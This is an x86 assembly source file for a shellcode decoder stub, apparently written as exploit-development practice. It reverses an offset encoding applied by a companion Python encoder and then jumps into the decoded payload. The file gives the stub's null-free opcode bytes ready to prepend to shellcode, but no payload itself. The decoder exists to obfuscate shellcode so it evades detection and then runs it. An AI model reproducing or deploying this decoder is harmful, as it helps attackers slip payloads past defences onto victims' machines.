; This algorithm decodes and executes shellcode that got encoded with Diffuscator.py
;
; Algorithm is very simple (and not very space-effective) but so what ...
; It's taking a shellcode byte, generating a random offset (int number), subtract the
; offset from the shellcode byte and stores both bytes again. So it's basically doubling
; the bytes but also modifies the original shell bytes to make things less obvious.

; Create elf32 executable with: ./compile.sh diffuscate-decoder
;
; some nifty details
; -^- 32 bytes
; -^- zero zero's

; decoder code bytes:
;
; "\xeb\x19\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x8a\x5c\x06\x01\x02\x1c\x06\x74\x0c\x88\x1f\x47\x04\x02\xeb\xf0\xe8\xe2\xff\xff\xff"
;

global _start			

section .text
_start:
        jmp short call_shellcode

decoder:
        pop esi
        lea edi, [esi]            ; pointer to encoded shellcode (next target byte, incrementing during loop)
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
decode:
        mov bl, byte [esi+eax+1]    ; eax: outer pointer
        add bl, byte [esi+eax]      ; add offset
        jz  EncodedShellcode          ; break loop if zero (end) is reached
        mov byte [edi], bl
        inc edi                     ; edi: inner pointer
        add al, 2
        jmp short decode

call_shellcode:
        call decoder

EncodedShellcode:
; following some shellcode, either hardcoded in this file or appended by Diffuscator.py

